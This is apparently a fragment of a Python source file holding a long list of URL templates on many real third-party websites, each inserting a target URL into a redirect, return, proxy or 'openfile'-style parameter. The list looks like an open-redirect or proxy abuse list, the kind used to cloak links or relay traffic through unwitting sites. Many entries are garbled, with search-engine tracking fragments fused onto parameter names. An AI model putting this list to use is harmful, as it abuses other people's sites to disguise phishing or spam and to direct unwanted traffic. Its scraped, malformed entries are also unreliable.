			"http://content.dynamicmessenger.com/cornerstone/?0DjcXFrxPxxF1rAmlZQQabHNGyFLO7Hl0&http://www.thestar.com/news/gta/article/1264293--openfile-news-website-suspends-publishing-ahead-of-pretty-big-change&amp;sa=U&amp;ved=0ahUKEwik_6Ha0e7KAhVKw2MKHR7SAT0QFgjnATAl&amp;usg=AFQjCNFuhQarx5FnSDV91RBCR880xvz7Ywopenfile=%s"%(url),
			"http://magazine.joomla.org/issues/issue-feb-2015/item/2525-revealing-joomla-s-seo-secrets-redirect-manager-com-redirect&amp;sa=U&amp;ved=0ahUKEwjHorHO0e7KAhUT3mMKHRjVBDoQFgirAjAw&amp;usg=AFQjCNFq2yTZ_6S-UtvHSDVookfNR2KHXQredirect=%s"%(url),
			"http://localnewsresearchproject.ca/2014/10/27/explore-openfile-ca-news-coverage/&amp;sa=U&amp;ved=0ahUKEwik_6Ha0e7KAhVKw2MKHR7SAT0QFgiYBDBc&amp;usg=AFQjCNGBpF2RJy5FGyf-obC2mrenC4o-GQopenfile=%s"%(url),
			"http://addons.silverstripe.org/add-ons/cyberduck/referer-tracker&amp;sa=U&amp;ved=0ahUKEwiwgozQ0e7KAhUM9WMKHTebDbgQFgiCAjAp&amp;usg=AFQjCNF3xlQvi_jXAoilaWv3vj88Zua5ewreferer=%s"%(url),
			"http://davidtopping.tumblr.com/post/42974328699/what-openfile-owes&amp;sa=U&amp;ved=0ahUKEwik_6Ha0e7KAhVKw2MKHR7SAT0QFgjKATAg&amp;usg=AFQjCNGMiWUgKF__KySslo5GIv3W0V1buwopenfile=%s"%(url),
			"http://homakov.blogspot.com/2012/04/playing-with-referer-origin-disquscom.html&amp;sa=U&amp;ved=0ahUKEwiwgozQ0e7KAhUM9WMKHTebDbgQFgiUAjAs&amp;usg=AFQjCNFAtAgQIrI4agJFzpFzTYOSMC8BbAreferer=%s"%(url),
			"http://forums.asp.net/t/2045424.aspx?MVC5+using+Microsoft+Account+redirect_uri+is+not+valid+&amp;sa=U&amp;ved=0ahUKEwjrw9vL0e7KAhUS72MKHQipBIoQFgieATAY&amp;usg=AFQjCNFcceLBQqzdDFISHSwtdxTEDvnBhgredirect_uri=%s"%(url),
			"http://javascript.ru/forum/dom-window/34810-parent-body-location-href=-pageurl;.html&amp;sa=U&amp;ved=0ahUKEwjyrojS0e7KAhVH_WMKHRdEAKYQFgjcAzBX&amp;usg=AFQjCNEXsZk3KSGq6_ROZm7mXl03PI1G3Apageurl=%s"%(url),
			"http://forum.aurakingdom.to/showthread.php?1182-OpenFIle-Error-for-LoadDB-After-patch&amp;sa=U&amp;ved=0ahUKEwik_6Ha0e7KAhVKw2MKHR7SAT0QFgikBDBe&amp;usg=AFQjCNEBg47ULWzcDN8SLwTXuHql9ye6gQopenfile=%s"%(url),
			"http://dynamicsnavax.blogspot.com/2013/09/bug-parameter-pageurl-is-missing-or.html&amp;sa=U&amp;ved=0ahUKEwjyrojS0e7KAhVH_WMKHRdEAKYQFgjsATAp&amp;usg=AFQjCNG40Hf9az1UdPbX5dNP54JJlhMqLApageurl=%s"%(url),
			"http://www.terrywhitechemists.com.au/redirect.php?url=%s"%(url),
			"http://www.webdeveloper.com/forum/showthread.php?110626-If-referer-is-xxx-then-do-this&amp;sa=U&amp;ved=0ahUKEwiwgozQ0e7KAhUM9WMKHTebDbgQFgiwBDBb&amp;usg=AFQjCNHdSX4M3AX78dHIR1MjUxl01UzpJQreferer=%s"%(url),
			"http://developers-forum.mercadolibre.com/index.php?/tags/forums/redirect_uri/&amp;sa=U&amp;ved=0ahUKEwj96br-pfLKAhVIoJQKHVOuC3gQFgh2MBE&amp;usg=AFQjCNGZ-EXWdp9XtcUSvSok9J_bznpJFAredirect_uri=%s"%(url),
			"http://chomikuj.pl/action/Login?return=%s"%(url),
			"http://ejje.weblio.jp/content/redirect&amp;sa=U&amp;ved=0ahUKEwjHorHO0e7KAhUT3mMKHRjVBDoQFgisBDBd&amp;usg=AFQjCNF5t3Qpptj_Lt6AzYIi_2s0Haeqawredirect=%s"%(url),
			"http://forums.asp.net/t/954304.aspx?Forms+Authentication+Disable+ReturnUrl&amp;sa=U&amp;ved=0ahUKEwjQiJnU0e7KAhUI92MKHdoQCfAQFggiMAI&amp;usg=AFQjCNGou-pUeoa4kNv28gmA_sOwzerpHAreturnUrl=%s"%(url),
			"http://www.vbforums.com/showthread.php?447907-How-to-open-a-file-using-openfile()-method&amp;sa=U&amp;ved=0ahUKEwik_6Ha0e7KAhVKw2MKHR7SAT0QFgiCBDBY&amp;usg=AFQjCNG0diFsuyIRg_FwicKWc6d9YzyUBQopenfile=%s"%(url),
			"http://feed.informer.com/validator/check.cgi?url=%s"%(url),
			"http://omahkain.com/search/AngularJS+and+Google+OAuth2+redirect_uri+++Stack+Overflow/&amp;sa=U&amp;ved=0ahUKEwjrw9vL0e7KAhUS72MKHQipBIoQFgjWAzBU&amp;usg=AFQjCNFm4wl8QKlRRvvJnCVZL2pCcHEuRwredirect_uri=%s"%(url),
			"http://www.yiiframework.com/forum/index.php/topic/5325-returnurl-question/&amp;sa=U&amp;ved=0ahUKEwjQiJnU0e7KAhUI92MKHdoQCfAQFghsMBE&amp;usg=AFQjCNE__4CFRLN5LoivTpUEKHRU0IGBlAreturnUrl=%s"%(url),
			"http://davidtopping.tumblr.com/post/42974328699/what-openfile-owesopenfile=%s"%(url),
			"http://davidtopping.tumblr.com/post/42974328699/what-openfile-owes&amp;sa=U&amp;ved=0ahUKEwi5usfv6KDLAhXDnZQKHRk-DPEQFgiaATAY&amp;usg=AFQjCNGMiWUgKF__KySslo5GIv3W0V1buwopenfile=%s"%(url),
			"http://szkolamilano.altervista.org/pagina-645309.htmlpagina=%s"%(url),
			"http://thechronicleherald.ca/novascotia/141787-openfile-news-site-on-hiatus&amp;sa=U&amp;ved=0ahUKEwik_6Ha0e7KAhVKw2MKHR7SAT0QFgiCAjAq&amp;usg=AFQjCNEtGDZjYK0JknJDtvwxV1s46mHbxAopenfile=%s"%(url),
			"http://projeto.rcaap.pt/index.php/lang-pt/ligacoes-uteis/22-software-ferramentas-e-protocolos/15-open-archives-initiative&amp;sa=U&amp;ved=0ahUKEwiX-6Dc0e7KAhVG4GMKHXqVBhYQFgjxATAp&amp;usg=AFQjCNHPOiCY7Uj6zj9mAi-SjTa2_G53Ywopen=%s"%(url),
			"http://www.xcelenergy.com/stateselector?stateSelected=true&goto=%s"%(url),
			"http://omahkain.com/search/google+oauth2+redirect_uri+with+several+parameters+++Stack+Overflow/&amp;sa=U&amp;ved=0ahUKEwj96br-pfLKAhVIoJQKHVOuC3gQFgiCAzBD&amp;usg=AFQjCNGSUfOIrwwvONA28-zLhh74MGyNrAredirect_uri=%s"%(url),
			"http://www.icdcprague.org/index.php?id=%s"%(url),
			"http://www.finereader.pl/redir_demo/1/ABBYY+FineReader+12+Professional+Editionredir=%s"%(url),
			"http://translate.google.com/translate?u=%s"%(url),
			"http://homakov.blogspot.com/2014/05/covert-redirect-faq.html&amp;sa=U&amp;ved=0CN4BEBYwIWoVChMItMDeo-CPyQIVSwwsCh3WbQVp&amp;usg=AFQjCNEBs1Kjb8DfZW8nAcDmwZv_8vPhGAredirect=%s"%(url),
			"http://javascript.ru/forum/dom-window/34810-parent-body-location-href=-pageurl;.html&amp;sa=U&amp;ved=0ahUKEwio-4Ccj7nKAhUW52MKHYctBpgQFgjmAzBZ&amp;usg=AFQjCNEXsZk3KSGq6_ROZm7mXl03PI1G3Apageurl=%s"%(url),
			"http://voilier.tabasco.free.fr/article.php?ID_ARTICLE=130article.php?id=%s"%(url),
			"http://www.dorianefilms.com/catalog.php%s"%(url),
			"http://www.oms-chaumont.com/ECAC-Basket.php?id=30basket.php?id=%s"%(url),
			"http://book.vuilen.com/book_view.php?bookid=%s"%(url),
			"http://pieces-tout-electromenager.com/catalog.php%s"%(url),
			"http://www.peugeotsport-store.com/category.php%s"%(url),
			"http://forums.asp.net/t/2045424.aspx?MVC5+using+Microsoft+Account+redirect_uri+is+not+valid+&amp;sa=U&amp;ved=0ahUKEwj96br-pfLKAhVIoJQKHVOuC3gQFgieATAY&amp;usg=AFQjCNFcceLBQqzdDFISHSwtdxTEDvnBhgredirect_uri=%s"%(url),
			"http://www.nostsuspension.com/affiliates.php?id=%s"%(url),
			"http://www.mosaicidonamurano.com/fr/ajax_shop_cart.php?id=%s"%(url),
			"http://www.angermann-posamenten.de/engine.php?q=add_cart.php?numadd_cart.php?num=%s"%(url),
			"http://forums.asp.net/t/886708.aspx?Is+there+a+way+to+remove+the+returnUrl+querystring+&amp;sa=U&amp;ved=0ahUKEwio9JTh9PfKAhXMOyYKHQV-A-cQFggyMAY&amp;usg=AFQjCNH-VJhpcjC8FToCFQi99gqesx4ulwreturnUrl=%s"%(url),
			"http://play.americangirl.com/play/books/advice/book.php?bookid=CareKeepingBook.php?bookID=%s"%(url),
			"http://play.americangirl.com/play/books/activities/book.php?bookid=DollPhotoShootBook.php?bookID=%s"%(url),
			"http://www.sfendocrino.org/article.php?id=%s"%(url),
			"http://www.mbgraphic.fr/category.php?catid=%s"%(url),
			"http://n10zvalves.com/affiliates.php?id=%s"%(url),
			"http://www.sapo.com.cy/browse.php?catID=4browse.php?catid=%s"%(url),
			"http://www.cattaneobros.com/add_to_cart.php?id=327add-to-cart.php?ID=%s"%(url),
			"http://www.nichegardens.com/catalog/item.php?id=2257catalog_item.php?ID=%s"%(url),
			"http://www.hurrichips.com/catalog.php%s"%(url),
			"http://gastronoome.com/category.php?catid=%s"%(url),
			"http://p205gti.free.fr/index.php?url=%s"%(url),
			"http://comic.vuilen.com/view_book_detail.php?bookid=209&amp;chapterid=3087book_detail.php?BookID=%s"%(url),
			"https://mon.ilasallecampus.com/local/custom_pages/catalog.php%s"%(url),
			"http://ckthonon.free.fr/index.php?url=%s"%(url),
			"http://www.jerrapark.com/index.php?ID=150&amp;SHOW=cart&amp;additem=en_1080cart_additem.php?id=%s"%(url),
			"https://www.nichegardens.com/catalog/item.php?id=1391catalog_item.php?ID=%s"%(url),
			"http://www.kingsleynorth.com/skshop/category.php?catID=88category.php?catid=%s"%(url),
			"http://oddhour.tumblr.com/post/61615825882/redirect-your-old-tumblr-links-to-your-new&amp;sa=U&amp;ved=0CKABEBYwF2oVChMI7LurreGSyQIVSf4sCh3cCQlY&amp;usg=AFQjCNF_NBe9ogQWn8r182qw2Ar7TGAgSgredirect=%s"%(url),
			"http://www.trex.uqam.ca/index.php?action=%s"%(url),
			"http://oddhour.tumblr.com/post/61615825882/redirect-your-old-tumblr-links-to-your-new&amp;sa=U&amp;ved=0CKACEBYwLGoVChMItMDeo-CPyQIVSwwsCh3WbQVp&amp;usg=AFQjCNF_NBe9ogQWn8r182qw2Ar7TGAgSgredirect=%s"%(url),
			"http://oddhour.tumblr.com/post/61615825882/redirect-your-old-tumblr-links-to-your-new&amp;sa=U&amp;ved=0ahUKEwjUlP6UopPKAhVBU2MKHWNUAFIQFgi9ATAd&amp;usg=AFQjCNF_NBe9ogQWn8r182qw2Ar7TGAgSgredirect=%s"%(url),
			"http://lingofox.dw.com/index.php?url=%s"%(url),
			"http://fotokarta.info/map/map.php?url=%s"%(url),
			"http://forums.nogooom.net/go.php?url=%s"%(url),
			"http://oddhour.tumblr.com/post/61615825882/redirect-your-old-tumblr-links-to-your-new&amp;sa=U&amp;ved=0ahUKEwicn-2q7JzKAhVFvBoKHaqjA74QFgitAjAx&amp;usg=AFQjCNF_NBe9ogQWn8r182qw2Ar7TGAgSgredirect=%s"%(url),
			"http://www.webpark.ru/go.php?url=%s"%(url),
			"http://stand.nalog.ru/admin/login/?url=%s"%(url),
			"http://brd.unid.edu.mx/wp-content/plugins/google-document-embedder/proxy.php?url=http://brd.unid.edu.mx/recursos/Contabilidaddecostos/Bloque5/Lecturas/1.ApuntesdecostosIII.pdf&hl=es&mobile=true&amp;sa=U&amp;ved=0ahUKEwjjg67smdPKAhVG2qYKHdnDD64QFgiWAzBS&amp;usg=AFQjCNH_if7RadQoUu_rFc0F1j4KplAHJwproxy.php?url=1%s"%(url),
			"http://mihavxc.ru/go.php?url=%s"%(url),
			"https://or71.ru/news/detail.php?ID=%s"%(url),
			"http://forums.9carthai.com/go.php?url=%s"%(url),
			"http://www.aidsalliance.org.ua/cgi-bin/index.cgi?url=%s"%(url),
			"https://survivalservers.com/wiki/index.php?title=File:PageURL.jpg&amp;sa=U&amp;ved=0ahUKEwjU1aGZopPKAhUC9GMKHd9_AusQFgjRATAm&amp;usg=AFQjCNEfWhaWbCWw_W5mCdpnQllizjSlxQpageurl=%s"%(url),
			"http://wapblogs.eu/ejuz.php?url=%s"%(url),
			"https://survivalservers.com/wiki/index.php?title=File:PageURL.jpg&amp;sa=U&amp;ved=0ahUKEwjI__nTipjKAhUDUZAKHXdwBi4QFgjGATAj&amp;usg=AFQjCNEfWhaWbCWw_W5mCdpnQllizjSlxQpageurl=%s"%(url),
			"http://www.semex.com/popurl.cgi?url=%s"%(url),
			"http://www.geogr.msu.ru/bitrix/rk.php?goto=http://s5.shinystat.com/cgi-bin/redir.cgi?URL=http://www.nursingfacultyjobs.comcgi?url=%s"%(url),
			"http://www.webdeveloper.com/forum/showthread.php?281825-open-to-two-php-url-variable-in-frameset&amp;sa=U&amp;ved=0ahUKEwipxN3xi53LAhVjJJoKHVGlAb8QFgilAjA0&amp;usg=AFQjCNFHhV2bJKVj-XBtniVFqg5WFOkBag.php?url=%s"%(url),
			"http://www.mrsu.ru/bitrix/rk.php?goto=http://www.i-paradise.nu/uranai/index.cgi?url=%s"%(url),
			"http://www.ebesucher.ru/index.php?link=%s"%(url),
			"http://addedtheurl.com/?url=%s"%(url),
			"http://www.ascold.ru/?s=dplsearch&amp;site_id=%s"%(url),
			"http://brd.unid.edu.mx/wp-content/plugins/google-document-embedder/proxy.php?url=http://brd.unid.edu.mx/recursos/Contabilidaddecostos/Bloque5/Lecturas/1.ApuntesdecostosIII.pdf&hl=es&mobile=true&amp;sa=U&amp;ved=0ahUKEwjg9-enmtPKAhXmG6YKHVdLCiwQFgiWAzBS&amp;usg=AFQjCNH_if7RadQoUu_rFc0F1j4KplAHJwproxy.php?url=1%s"%(url),
			"http://www.sitepoint.com/forums/showthread.php?411748-php-proxy-php-and-nph-proxy-cgi-got-hackedphp/Proxy.php%s"%(url),
			"http://citecclub.org/forum/redirector.php?url=%s"%(url),
			"http://www.5x5fotbalsrl.ro/index.php?link=%s"%(url),
			"http://netmon.net.bsu.edu/noc/noc_menu.cgi?url=%s"%(url),
			"http://www.stthom.edu/Academics/School_of_Nursing/Index.aqf?Aquifer_Source_URL=/nursing&PNF_Check=1?url=%s"%(url),
			"http://www.eleonor-corp.ru/index.php?link=%s"%(url),
			"http://www.pipeshop.ru/index.php?link_n=3php?link=%s"%(url),
			"http://www.remcomplekt.ru/cat_info.php?idi=69913&amp;idn=146cat=info%s"%(url),
			"https://survivalservers.com/wiki/index.php?title=File:PageURL.jpg&amp;sa=U&amp;ved=0ahUKEwio-4Ccj7nKAhUW52MKHYctBpgQFgjQATAk&amp;usg=AFQjCNEfWhaWbCWw_W5mCdpnQllizjSlxQpageurl=%s"%(url),
			"http://www.anpcdefp.ro/anpcdefp.php?link=%s"%(url),
			"http://sogma.ru/index.php?page[common]=site&amp;id=5&amp;cat=folder&amp;band=0&amp;fid=114site_id=%s"%(url),
			"https://survivalservers.com/wiki/index.php?title=File:PageURL.jpg&amp;sa=U&amp;ved=0ahUKEwjyrojS0e7KAhVH_WMKHRdEAKYQFgjQATAk&amp;usg=AFQjCNEfWhaWbCWw_W5mCdpnQllizjSlxQpageurl=%s"%(url),
			"http://www.skbis.ru/index.php?p=%s"%(url),
			"http://7ba.ru/out.php?url=http://www.superdownload.us/link/?url=https://www.kiwibox.com/levelplast457/blog/entry/124146693/psicopedagogia/link?url=%s"%(url),
			"http://www.muslimthai.com/network.php?url=%s"%(url),
			"http://www.businesstest.ru/default.asp?id_testgroup=27asp?id=%s"%(url),
			"http://webbugtrack.blogspot.com/2008/11/bug-421-ie-fails-to-pass-http-referer.html&amp;sa=U&amp;ved=0ahUKEwiwgozQ0e7KAhUM9WMKHTebDbgQFgijBDBZ&amp;usg=AFQjCNHqLa_174X3NuCdHqfZOk7kBP2HTQreferer=%s"%(url),
			"http://business.louisville.edu/cob-it-blog/wp-content/plugins/google-document-embedder/proxy.php?url=http://business.louisville.edu/cob-it-blog/resources/university-email-changes.pdf?1411994341&hl=en_US&gdet=z&embedded=true&amp;sa=U&amp;ved=0ahUKEwidtqPks_zLAhUlF6YKHW0TDeMQFggTMAE&amp;usg=AFQjCNHPxunTUQ4jIGbAc2c31JefQgrEpQinurl:proxy.php?url=%s"%(url),
			"https://www.google.com/webmasters/tools/submit-url?hl=ru?url=%s"%(url),
			"http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=%s"%(url),
			"http://www.caafcgilsicilia.it/?id_pagina=%s"%(url),
			"https://super2010.trenitalia.it/sl/Login/go.aspx?url=%s"%(url),
			"http://www.professioni24.ilsole24ore.com/?page=%s"%(url),
			"http://gbs.realwap.net/guest.php/putra.minang/www.klikvsikita.com/putra.minang/www.klikvsikita.com/cpanel.php?id=%s"%(url),
			"http://www.karplaw.com/index.php?go=%s"%(url),
			"http://www.sansiro.net/?page_id=2748page=%s"%(url),
			"http://www.veithsymposium.org/index.php?pg=%s"%(url),
			"http://www.osronline.com/cf.cfm?PageURL=showlists.CFM?list=NTDEVpageurl=%s"%(url),
			"http://www.sian.it/portale-sian/login?redirectTo=home.jspredirect=%s"%(url),
			"https://mytopfiles.com/search.php?ss='''tube/buy.php?category=bol-chat.de/proxy.php?urlproxy.php?url=%s"%(url),
			"http://www.budogu.jp/cart/syscheck.cgi?url=%s"%(url),
			"http://www.mytaxcollector.com/trsearch.aspx?redir=%s"%(url),
			"http://sfpl.org/index.php?pg=%s"%(url),
			"http://www2.vcdh.virginia.edu/cem/person-search.php?go=%s"%(url),
			"http://www.nyandcompany.com/nyco/article/articleTemplate.jsp?pageUrl=/html/catalog/benefits-rewardsClub.html&heading=Benefitspageurl=%s"%(url),
			"http://support.lexmark.com/index?page=%s"%(url),
			"http://www.titantv.com/account/login.aspx?returnUrl=/Default.aspxreturn=%s"%(url),
			"http://developers-forum.mercadolibre.com/index.php?/tags/forums/redirect_uri/&amp;sa=U&amp;ved=0ahUKEwj4hL7Y06fMAhUCoD4KHRatAG0QFgiUATAV&amp;usg=AFQjCNGZ-EXWdp9XtcUSvSok9J_bznpJFAredirect_uri=%s"%(url),
			"http://www.benefitmall.com/?TabID=36&emailurl=%s"%(url),
			"http://www.benefitmall.com/?TabID=36&emailurl=comm?url=%s"%(url),
			"http://forums.asp.net/t/954304.aspx?Forms+Authentication+Disable+ReturnUrl&amp;sa=U&amp;ved=0ahUKEwjSloudqKbMAhWktoMKHQQvDvsQFggiMAI&amp;usg=AFQjCNGou-pUeoa4kNv28gmA_sOwzerpHAreturnUrl=%s"%(url),
			"http://www.cssprogram.net/?page=%s"%(url),
			"http://blog.jorritsalverda.com/2010/03/maintainable-mvc-post-redirect-get.html&amp;sa=U&amp;ved=0ahUKEwjLzI_b06fMAhWFbz4KHWeTDm4QFgj5AjA7&amp;usg=AFQjCNFQgSIlmN6GsnZMpBzkgjFktFTyEAredirect=%s"%(url),
			"http://www.muribeachclubhotel.com/?uri=%s"%(url),
			"http://apidock.com/rails/Rack/Request/referer&amp;sa=U&amp;ved=0ahUKEwiTxJTd06fMAhVJET4KHcvUA3AQFgidATAX&amp;usg=AFQjCNHajOMVw7RUaHBD3OTCNQcIHsJzdgreferer=%s"%(url),
			"https://webmasters.googleblog.com/2009/01/open-redirect-urls-is-your-site-being.html&amp;sa=U&amp;ved=0ahUKEwjLzI_b06fMAhWFbz4KHWeTDm4QFgi_ATAd&amp;usg=AFQjCNGoEIh4Ugqf57hssuSKsp5r6m8BHwredirect=%s"%(url),
			"http://addons.silverstripe.org/add-ons/cyberduck/referer-tracker&amp;sa=U&amp;ved=0ahUKEwiTxJTd06fMAhVJET4KHcvUA3AQFgiMAjAp&amp;usg=AFQjCNF3xlQvi_jXAoilaWv3vj88Zua5ewreferer=%s"%(url),
			"http://www.webdeveloper.com/forum/showthread.php?110626-If-referer-is-xxx-then-do-this&amp;sa=U&amp;ved=0ahUKEwiTxJTd06fMAhVJET4KHcvUA3AQFgi4BDBb&amp;usg=AFQjCNHdSX4M3AX78dHIR1MjUxl01UzpJQreferer=%s"%(url),
			"http://coo.lumc.nl/TRC/redirect.aspx?lessonid=30&amp;sa=U&amp;ved=0ahUKEwjLzI_b06fMAhWFbz4KHWeTDm4QFgiEBDBU&amp;usg=AFQjCNGwpKfH0K5sar_CW0_imhgm-O1lcQredirect=%s"%(url),
			"http://www.eztaxreturn.com/scriptsez/start.exe/eztax/home.html?r_link=undefinedreturn=%s"%(url),
			"http://ichich2015.pixnet.net/blog/post/249298813-0033-0-facebook-app-invalid-redirect_uri-??????&amp;sa=U&amp;ved=0ahUKEwj4hL7Y06fMAhUCoD4KHRatAG0QFgjMAzBQ&amp;usg=AFQjCNFEusKyD48-QMxbN8JfERSu8zJzNgredirect_uri=%s"%(url),
			"http://homakov.blogspot.com/2012/04/playing-with-referer-origin-disquscom.html&amp;sa=U&amp;ved=0ahUKEwiTxJTd06fMAhVJET4KHcvUA3AQFgiZAjAr&amp;usg=AFQjCNFAtAgQIrI4agJFzpFzTYOSMC8BbAreferer=%s"%(url),
			"http://ejje.weblio.jp/content/redirect&amp;sa=U&amp;ved=0ahUKEwjLzI_b06fMAhWFbz4KHWeTDm4QFgjHAzBJ&amp;usg=AFQjCNF5t3Qpptj_Lt6AzYIi_2s0Haeqawredirect=%s"%(url),
			"http://forum.aurakingdom.to/showthread.php?1182-OpenFIle-Error-for-LoadDB-After-patch&amp;sa=U&amp;ved=0ahUKEwixnYTn06fMAhWCWz4KHQSvDW4QFgi5AzBJ&amp;usg=AFQjCNEBg47ULWzcDN8SLwTXuHql9ye6gQopenfile=%s"%(url),
			"http://www.autonews.com/section/@nyx.pageurl@&amp;sa=U&amp;ved=0ahUKEwiu-Nfe06fMAhWIbT4KHU2WB20QFgi1AjA3&amp;usg=AFQjCNHWR0YpU-H_jnpoeBe2sRsRflzsrQpageurl=%s"%(url),
			"http://content.dynamicmessenger.com/cornerstone/?0DjcXFrxPxxF1rAmlZQQabHNGyFLO7Hl0&http://www.thestar.com/news/gta/article/1264293--openfile-news-website-suspends-publishing-ahead-of-pretty-big-change&amp;sa=U&amp;ved=0ahUKEwixnYTn06fMAhWCWz4KHQSvDW4QFgjWATAi&amp;usg=AFQjCNFuhQarx5FnSDV91RBCR880xvz7Ywopenfile=%s"%(url),
			"https://survivalservers.com/wiki/index.php?title=File:PageURL.jpg&amp;amp;sa=U&amp;amp;ved=0ahUKEwio-4Ccj7nKAhUW52MKHYctBpgQFgjQATAk&amp;amp;usg=AFQjCNEfWhaWbCWw_W5mCdpnQllizjSlxQpageurl=%s"%(url),
			"http://localnewsresearchproject.ca/2014/10/27/explore-openfile-ca-news-coverage/&amp;sa=U&amp;ved=0ahUKEwixnYTn06fMAhWCWz4KHQSvDW4QFgjfAzBQ&amp;usg=AFQjCNGBpF2RJy5FGyf-obC2mrenC4o-GQopenfile=%s"%(url),
			"http://dynamicsnavax.blogspot.com/2013/09/bug-parameter-pageurl-is-missing-or.html&amp;sa=U&amp;ved=0ahUKEwiu-Nfe06fMAhWIbT4KHU2WB20QFgiGAjAv&amp;usg=AFQjCNG40Hf9az1UdPbX5dNP54JJlhMqLApageurl=%s"%(url),
			"http://davidtopping.tumblr.com/post/42974328699/what-openfile-owes&amp;sa=U&amp;ved=0ahUKEwixnYTn06fMAhWCWz4KHQSvDW4QFgi_ATAe&amp;usg=AFQjCNGMiWUgKF__KySslo5GIv3W0V1buwopenfile=%s"%(url),
			"https://survivalservers.com/wiki/index.php?title=File:PageURL.jpg&amp;amp;sa=U&amp;amp;ved=0ahUKEwjI__nTipjKAhUDUZAKHXdwBi4QFgjGATAj&amp;amp;usg=AFQjCNEfWhaWbCWw_W5mCdpnQllizjSlxQpageurl=%s"%(url),
			"http://lyricstranslate.com/en/pagina-bianca-blank-page.html&amp;sa=U&amp;ved=0ahUKEwilvbbu06fMAhVEeT4KHXFuD20QFgiKAjAr&amp;usg=AFQjCNHqd6kN4oLwutWPS_Obsg-xm1646gpagina=%s"%(url),
			"http://www.perseus.tufts.edu/hopper/morph?l=pagina&la=la&amp;sa=U&amp;ved=0ahUKEwilvbbu06fMAhVEeT4KHXFuD20QFgiRAjAs&amp;usg=AFQjCNFQ8nI0i5_977AMk-Oc5LxVOxYHcwpagina=%s"%(url),
			"http://webmail.juno.com/?cf=spl&amp;start_page=5&amp;session_redirect=%s"%(url),
			"http://webmail.juno.com/?cf=spl&start_page=5&session_redirect=%s"%(url),
			"http://www.mofa.gov.sa/m/en/info/Pages/viewarticle.aspx?pageurl=%s"%(url),
			"http://www.vbforums.com/showthread.php?447907-How-to-open-a-file-using-openfile()-method&amp;sa=U&amp;ved=0ahUKEwixnYTn06fMAhWCWz4KHQSvDW4QFgitAzBH&amp;usg=AFQjCNG0diFsuyIRg_FwicKWc6d9YzyUBQopenfile=%s"%(url),
			"http://thechronicleherald.ca/novascotia/141787-openfile-news-site-on-hiatus&amp;sa=U&amp;ved=0ahUKEwixnYTn06fMAhWCWz4KHQSvDW4QFgjLATAg&amp;usg=AFQjCNEtGDZjYK0JknJDtvwxV1s46mHbxAopenfile=%s"%(url),
			"http://javascript.ru/forum/dom-window/34810-parent-body-location-href=-pageurl;.html&amp;sa=U&amp;ved=0ahUKEwiu-Nfe06fMAhWIbT4KHU2WB20QFgjFAzBV&amp;usg=AFQjCNEXsZk3KSGq6_ROZm7mXl03PI1G3Apageurl=%s"%(url),
			"http://forums.asp.net/t/2045424.aspx?MVC5+using+Microsoft+Account+redirect_uri+is+not+valid+&amp;sa=U&amp;ved=0ahUKEwj4hL7Y06fMAhUCoD4KHRatAG0QFgiNATAU&amp;usg=AFQjCNFcceLBQqzdDFISHSwtdxTEDvnBhgredirect_uri=%s"%(url),
			"http://xn.wo.lt/redirect.php?url=http://webmail.Aliceadsl.fr/horde/util/go.php?%s"%(url),
			"http://developers-forum.mercadolibre.com/index.php?/tags/forums/redirect_uri/&amp;sa=U&amp;ved=0ahUKEwil-Mem76rMAhWCAJoKHS4DDIwQFgiPATAU&amp;usg=AFQjCNGZ-EXWdp9XtcUSvSok9J_bznpJFAredirect_uri=%s"%(url),
			"http://apidock.com/rails/Rack/Request/referer&amp;sa=U&amp;ved=0ahUKEwjmsouq76rMAhUDlCwKHX2tAOwQFgiRATAV&amp;usg=AFQjCNHajOMVw7RUaHBD3OTCNQcIHsJzdgreferer=%s"%(url),
			"http://www.conceptispuzzles.com/index.aspx?uri=puzzle/link-a-pix&amp;sa=U&amp;ved=0ahUKEwiFkcXy06fMAhWSCD4KHaXWB3AQFgjaAzBQ&amp;usg=AFQjCNHO6hSVywhI9psNjgSUiIr95Ck1PAlink=%s"%(url),
			"https://webmasters.googleblog.com/2009/01/open-redirect-urls-is-your-site-being.html&amp;sa=U&amp;ved=0ahUKEwjH1qyo76rMAhUHlxoKHQdlDqkQFgiuATAa&amp;usg=AFQjCNGoEIh4Ugqf57hssuSKsp5r6m8BHwredirect=%s"%(url),
			"http://forums.smitegame.com/showthread.php?60316-Add-a-referer-doesn-t-work&amp;sa=U&amp;ved=0ahUKEwjmsouq76rMAhUDlCwKHX2tAOwQFgiZAjAr&amp;usg=AFQjCNGhp4F5xL2tXEuy9BYSTdGd5x-4Ewreferer=%s"%(url),
			"http://content.dynamicmessenger.com/cornerstone/?0DjcXFrxPxxF1rAmlZQQabHNGyFLO7Hl0&http://www.thestar.com/news/gta/article/1264293--openfile-news-website-suspends-publishing-ahead-of-pretty-big-change&amp;sa=U&amp;ved=0ahUKEwjmp7S076rMAhVD6xoKHZ6XA00QFgjWATAi&amp;usg=AFQjCNFuhQarx5FnSDV91RBCR880xvz7Ywopenfile=%s"%(url),
			"http://davidtopping.tumblr.com/post/42974328699/what-openfile-owes&amp;sa=U&amp;ved=0ahUKEwjmp7S076rMAhVD6xoKHZ6XA00QFgi6ATAd&amp;usg=AFQjCNGMiWUgKF__KySslo5GIv3W0V1buwopenfile=%s"%(url),
			"http://addons.silverstripe.org/add-ons/cyberduck/referer-tracker&amp;sa=U&amp;ved=0ahUKEwjmsouq76rMAhUDlCwKHX2tAOwQFgiGAjAo&amp;usg=AFQjCNF3xlQvi_jXAoilaWv3vj88Zua5ewreferer=%s"%(url),
			"http://www.ectransport.gov.za/?page_id=49page=%s"%(url),
			"http://homakov.blogspot.com/2012/04/playing-with-referer-origin-disquscom.html&amp;sa=U&amp;ved=0ahUKEwjmsouq76rMAhUDlCwKHX2tAOwQFgiSAjAq&amp;usg=AFQjCNFAtAgQIrI4agJFzpFzTYOSMC8BbAreferer=%s"%(url),
			"http://www.perseus.tufts.edu/hopper/morph?l=pagina&la=la&amp;sa=U&amp;ved=0ahUKEwjXp5e876rMAhWIDpoKHQxEBlYQFgivAjAy&amp;usg=AFQjCNFQ8nI0i5_977AMk-Oc5LxVOxYHcwpagina=%s"%(url),
			"http://dynamicsnavax.blogspot.com/2013/09/bug-parameter-pageurl-is-missing-or.html&amp;sa=U&amp;ved=0ahUKEwiMxtas76rMAhUEr4MKHXEbCIwQFgj2ATAs&amp;usg=AFQjCNG40Hf9az1UdPbX5dNP54JJlhMqLApageurl=%s"%(url),
